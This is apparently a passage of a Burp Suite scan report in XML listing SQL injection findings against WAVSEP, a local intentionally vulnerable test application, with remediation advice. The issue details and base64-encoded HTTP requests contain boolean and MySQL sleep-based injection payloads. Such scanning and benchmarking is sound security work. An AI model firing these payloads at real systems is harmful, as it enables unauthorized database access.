      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MzQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzIKPC9URD4KPFREPgoxMDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uSWQ9MTMyMzIxMTU1NTElMjBvciUyMDM0NzglM2QzNDc5IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE2LUluamVjdGlvbkluVmlldy1OdW1lcmljV2l0aG91dFF1b3Rlcy1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3RyYW5zYWN0aW9uSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1228996307256528896</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>91798221 or 2310=02310</b> and <b>68391484 or 6968=6974</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD9tc2dJZD0xOTE3OTgyMjElMjBvciUyMDIzMTAlM2QwMjMxMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzgNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMQo8L1REPgo8VEQ+CldlbGNvbWUgdG8gdGhlIHdlYiBzaXRlCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpSZW1lbWJlciB0byBjaGFuZ2UgeW91ciBwYXNzd29yZAo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgozCjwvVEQ+CjxURD4KWW91ciBhY2NvdW50IGlzIGFib3V0IHRvIGV4cGlyZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD9tc2dJZD0xNjgzOTE0ODQlMjBvciUyMDY5NjglM2Q2OTc0IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD9tc2dJZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1480196598392164352</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
